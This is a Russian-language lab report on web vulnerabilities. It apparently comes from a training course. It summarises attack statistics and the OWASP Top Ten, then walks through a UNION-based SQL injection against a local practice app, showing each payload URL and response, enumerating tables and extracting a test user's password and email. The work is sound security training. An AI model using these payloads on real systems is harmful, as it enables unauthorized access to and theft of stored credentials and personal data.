@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Лабораторная работа №1</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; line-height: 1.6; color: #333; }
+        h1, h2, h3 { color: #222; }
+        table { border-collapse: collapse; width: 100%; margin: 16px 0; }
+        th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-size: 0.95em; }
+        pre { background: #f4f4f4; padding: 12px; border-radius: 5px; overflow-x: auto; }
+        pre code { background: none; padding: 0; }
+        blockquote { border-left: 4px solid #ccc; margin: 0; padding-left: 16px; color: #555; }
+        hr { border: none; border-top: 1px solid #ddd; margin: 24px 0; }
+    </style>
+</head>
+<body>
+<h1>Лабораторная работа №1</h1>
+<h2>Веб-уязвимости: статистика и практика SQL-инъекций</h2>
+<hr />
+<h2>Часть I. Статистика атак через веб-уязвимости</h2>
+<h3>Источники</h3>
+<ol>
+<li>Verizon Data Breach Investigations Report 2025 — https://www.verizon.com/about/news/2025-data-breach-investigations-report</li>
+<li>Positive Technologies — Актуальные киберугрозы, H1 2025 — https://global.ptsecurity.com/en/research/analytics/</li>
+<li>OWASP Top Ten 2025 — https://owasp.org/www-project-top-ten/</li>
+</ol>
+<hr />
+<h3>Доля атак через веб-уязвимости</h3>
+<p>По данным Verizon DBIR 2025 (в отчёте проанализировано 22 052 инцидента в 139 странах), эксплуатация уязвимостей как способ первоначального доступа — это <strong>20% от всех подтверждённых утечек</strong>, причём по сравнению с прошлым годом этот показатель вырос на 34%. Ещё <strong>12% утечек</strong> приходится на прямые атаки на веб-приложения (Basic Web Application Attacks).</p>
+<p>По российским компаниям цифры немного другие. Positive Technologies в отчёте за первое полугодие 2025 г. указывает, что эксплуатация уязвимостей встречалась в <strong>31% успешных атак на организации</strong>. Чаще всего под удар попадали госучреждения (21%), промышленность (13%) и IT-компании (6%).</p>
+<p>Разница между 20% (глобально) и 31% (Россия) объясняется тем, что исследования считают разные вещи: Verizon смотрит только на подтверждённые утечки данных по всему миру, а Positive Technologies считает все успешные атаки на организации внутри страны.</p>
+<hr />
+<h3>Распределение по типам уязвимостей</h3>
+<p>OWASP каждый год публикует Top 10 самых опасных уязвимостей веб-приложений. В версии 2025 года первые строчки выглядят так:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Категория</th>
+<th>Пример</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A01</td>
+<td>Broken Access Control</td>
+<td>Обход авторизации, доступ к чужим данным</td>
+</tr>
+<tr>
+<td>A02</td>
+<td>Cryptographic Failures</td>
+<td>Передача паролей в открытом виде</td>
+</tr>
+<tr>
+<td>A03</td>
+<td>Injection (XSS, SQLi)</td>
+<td>SQL-инъекция, межсайтовый скриптинг</td>
+</tr>
+<tr>
+<td>A04</td>
+<td>Insecure Design</td>
+<td>Отсутствие защиты на уровне архитектуры</td>
+</tr>
+<tr>
+<td>A05</td>
+<td>Security Misconfiguration</td>
+<td>Открытые порты, дефолтные пароли</td>
+</tr>
+</tbody>
+</table>
+<p>В категорию Injection (A03) входят два самых распространённых типа атак:</p>
+<ul>
+<li><strong>XSS (Cross-Site Scripting, CWE-79)</strong> — злоумышленник вставляет вредоносный JavaScript в страницу, который потом выполняется в браузере другого пользователя</li>
+<li><strong>SQL Injection (CWE-89)</strong> — через поле ввода передаётся SQL-код, который меняет логику запроса к базе данных</li>
+</ul>
+<p>Эти два типа стабильно лидируют как по числу новых CVE, так и по частоте использования в реальных атаках. По данным Verizon DBIR 2025, в 88% прямых атак на веб-приложения использовались скомпрометированные учётные данные — нередко полученные как раз через XSS или фишинг.</p>
+<hr />
+<h3>Вывод</h3>
+<p>Веб-уязвимости остаются одним из главных способов атаки как в мире, так и в России. SQL-инъекции и XSS не теряют актуальности несмотря на то, что известны уже несколько десятков лет — в основном потому, что разработчики до сих пор не всегда проверяют и экранируют пользовательский ввод.</p>
+<hr />
+<h2>Часть II. Практика: SQL-инъекция</h2>
+<h3>Задание</h3>
+<ol>
+<li>Узнать пароль пользователя с ником <strong>Volk2</strong></li>
+<li>Узнать почту пользователя с ником <strong>Vinni-pukh</strong></li>
+</ol>
+<p>Приложение доступно по адресу: <code>http://localhost:8080/task/</code></p>
+<hr />
+<h3>Шаг 1. Проверка точки инъекции</h3>
+<p>На странице написано: <em>«Введите в качестве параметра ваш id»</em>. Пробуем передать параметр через URL:</p>
+<pre><code>http://localhost:8080/task/?id=1
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: 1, Ваш логин: admin</code> — приложение работает и возвращает данные из БД.</p>
+<p>Проверяем, уязвимо ли поле — добавляем одиночную кавычку:</p>
+<pre><code>http://localhost:8080/task/?id=1'
+</code></pre>
+<p><strong>Ответ:</strong></p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre>
+<p>Уязвимость есть. Из текста ошибки видно, что значение id оборачивается в кавычки: <code>WHERE id='1'</code>.</p>
+<hr />
+<h3>Шаг 2. Определение числа столбцов</h3>
+<p>Используем <code>ORDER BY</code> чтобы понять, сколько столбцов в запросе. Пробелы заменяем на <code>+</code>, в конце добавляем <code>--+</code> как комментарий:</p>
+<pre><code>http://localhost:8080/task/?id=1+ORDER+BY+1--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: 1, Ваш логин: admin</code> — норм.</p>
+<pre><code>http://localhost:8080/task/?id=1+ORDER+BY+2--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: 1, Ваш логин: admin</code> — норм.</p>
+<pre><code>http://localhost:8080/task/?id=1+ORDER+BY+3--+
+</code></pre>
+<p><strong>Ответ:</strong> ошибка SQL.</p>
+<p>Значит в запросе <strong>2 столбца</strong>.</p>
+<hr />
+<h3>Шаг 3. UNION SELECT</h3>
+<p>Пробуем UNION SELECT с <code>id=-1</code>, чтобы оригинальный запрос вернул пустой результат:</p>
+<pre><code>http://localhost:8080/task/?id=-1+UNION+SELECT+1,2--+
+</code></pre>
+<p><strong>Ответ:</strong> страница пустая.</p>
+<p>Добавляем кавычку перед UNION (значение обёрнуто в кавычки):</p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+1,2--+
+</code></pre>
+<p><strong>Ответ:</strong></p>
+<pre><code>The used SELECT statements have a different number of columns
+</code></pre>
+<p>Значит столбцов не 2. Пробуем 3:</p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+1,2,3--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: 1, Ваш логин: 2</code></p>
+<p>Столбцов <strong>3</strong>, на странице отображаются позиции 1 и 2.</p>
+<hr />
+<h3>Шаг 4. Изучение базы данных</h3>
+<p><strong>Список таблиц:</strong></p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+table_name,2,3+FROM+information_schema.tables+WHERE+table_schema=database()--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: emails</code> — только первая таблица.</p>
+<p>Используем <code>GROUP_CONCAT</code> чтобы получить все сразу:</p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(table_name),2,3+FROM+information_schema.tables+WHERE+table_schema=database()--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: emails, users</code></p>
+<p>Две таблицы: <code>emails</code> и <code>users</code>.</p>
+<p><strong>Столбцы таблицы <code>users</code>:</strong></p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='users'--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password</code></p>
+<p>Нас интересуют <code>username</code> и <code>password</code>.</p>
+<p><strong>Столбцы таблицы <code>emails</code>:</strong></p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='emails'--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: id, email_id</code></p>
+<p>Таблица содержит <code>id</code> (связь с таблицей users) и <code>email_id</code> (сам адрес почты).</p>
+<hr />
+<h3>Шаг 5. Пароль пользователя Volk2</h3>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+password,2,3+FROM+users+WHERE+username='Volk2'--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: Wa spoiuuuuu</code></p>
+<p><strong>Пароль Volk2: <code>Wa spoiuuuuu</code></strong></p>
+<hr />
+<h3>Шаг 6. Email пользователя Vinni-pukh</h3>
+<p>Email хранится в таблице <code>emails</code>. Сначала находим id пользователя в таблице <code>users</code>:</p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+id,2,3+FROM+users+WHERE+username='Vinni-pukh'--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: 4</code></p>
+<p>Теперь по этому id ищем почту:</p>
+<pre><code>http://localhost:8080/task/?id=-1'+UNION+SELECT+email_id,2,3+FROM+emails+WHERE+id=4--+
+</code></pre>
+<p><strong>Ответ:</strong> <code>Ваш id: honey_lover@otus-lab.com</code></p>
+<p><strong>Email Vinni-pukh: <code>honey_lover@otus-lab.com</code></strong></p>
+<hr />
+<h3>Итог</h3>
+<table>
+<thead>
+<tr>
+<th>Задание</th>
+<th>Результат</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Пароль Volk2</td>
+<td><code>Wa spoiuuuuu</code></td>
+</tr>
+<tr>
+<td>Email Vinni-pukh</td>
+<td><code>honey_lover@otus-lab.com</code></td>
+</tr>
+</tbody>
+</table>
+</body>
+</html>
